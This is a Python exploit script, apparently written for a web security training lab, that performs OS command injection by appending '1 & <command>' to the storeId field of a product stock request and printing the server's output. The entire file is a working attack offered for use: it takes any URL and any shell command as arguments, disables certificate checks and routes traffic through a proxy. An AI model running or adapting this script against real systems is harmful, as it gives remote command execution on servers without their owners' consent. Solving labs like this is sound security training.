# Lab: OS command injection
# This script injects a linux command in the product stock request
import sys
import urllib3
import requests
import os
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
}


def os_command_injection(s, url, command):
    stock_path = "/product/stock"
    print(url)
    command_injection = "1 & " + command
    data = {"productId": '1', "storeId": command_injection}
    r = s.post(url + stock_path, data=data, verify=False, proxies=proxies)

    if r.status_code == 200 and len(r.text) > 3:
        print(r.text)
    else:
        print(f"(-) Could not execute {command} command")
        sys.exit(-1)


def main():
    if len(sys.argv) != 3:
        print("(-> Usage: %s <url> <command>" % sys.argv[0])
        print("(-> Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> OS command injection ...")
    s = requests.Session()
    command = sys.argv[2]
    os_command_injection(s, url, command)


if __name__ == "__main__":
    main()
